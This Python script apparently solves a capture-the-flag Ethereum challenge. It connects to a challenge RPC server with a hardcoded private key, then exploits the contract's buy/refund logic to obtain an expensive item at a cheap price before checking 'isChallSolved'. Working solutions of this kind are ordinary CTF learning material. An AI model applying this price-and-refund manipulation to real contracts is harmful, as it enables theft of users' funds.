from web3 import Web3

# Connection and wallet setup
rpc_url = 'http://68.183.110.180:46378'
private_key = '0xc92ee022aa54502a7cafad29661cd82a2e9771d3b64f4848373563b2bbf38e04'
contract_address = '0xEB97c37e355f69961118Fe941328E9fA66430d1E'


w3 = Web3(Web3.HTTPProvider(rpc_url))
wallet_address = w3.eth.account.from_key(private_key).address

connected = w3.is_connected()
if not connected: raise ConnectionError("Could not connect to sever")

# ABI of the contract
abi = [
    {
        "constant": False,
        "inputs": [],
        "name": "reset",
        "outputs": [],
        "payable": True,
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "item", "type": "uint256"},
            {"name": "quantity", "type": "uint256"}
        ],
        "name": "buy",
        "outputs": [],
        "payable": True,
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "item", "type": "uint256"},
            {"name": "quantity", "type": "uint256"}
        ],
        "name": "refund",
        "outputs": [],
        "payable": True,
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "isChallSolved",
        "outputs": [
            {"name": "solved", "type": "bool"}
        ],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    }
]

contract = w3.eth.contract(address=contract_address, abi=abi)

def send_transaction(function, *args, value=0):
    txn = function(*args).build_transaction({
        'from': wallet_address,
        'nonce': w3.eth.get_transaction_count(wallet_address),
        'gas': 3000000,
        'gasPrice': w3.to_wei('1', 'gwei'),
        'value': value
    })
    signed_txn = w3.eth.account.sign_transaction(txn, private_key=private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    return tx_hash

def exploit():
    cheap_item = 0
    expensive_item = 3
    quantity = 1
    cheap_cost = w3.to_wei(5, 'ether')  # cost of item 0

    # Check balance
    balance = w3.eth.get_balance(wallet_address)
    print(f'Balance: {w3.from_wei(balance, "ether")} ETH')

    if balance < cheap_cost:
        print('Insufficient funds to perform the exploit')
        return

    # Buy cheap item
    print('Buying item 0...')
    tx_hash = send_transaction(contract.functions.buy, cheap_item, quantity, value=cheap_cost)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print('Bought item 0.')

    # Refund cheap item
    print('Refunding item 0...')
    tx_hash = send_transaction(contract.functions.refund, cheap_item, quantity)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print('Refunded item 0.')
    
    balance = w3.eth.get_balance(wallet_address)
    print(f'Balance: {w3.from_wei(balance, "ether")} ETH')

    # Directly set bought[3] to a positive value
    print('Setting bought[3] to a positive value...')
    tx_hash = send_transaction(contract.functions.buy, expensive_item, quantity, value=cheap_cost)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    if receipt.status: print('Bought item 3.')
    else:
        txn_details = w3.eth.get_transaction(tx_hash)
        print(f'Transaction Details: {txn_details}')
        raise RuntimeError('failed to buy key')

    # Check if challenge is solved
    solved = contract.functions.isChallSolved().call()
    if solved:
        print('Challenge Solved! You can now retrieve the flag.')
    else:
        print('Challenge not solved. Try again.')

if __name__ == '__main__':
    exploit()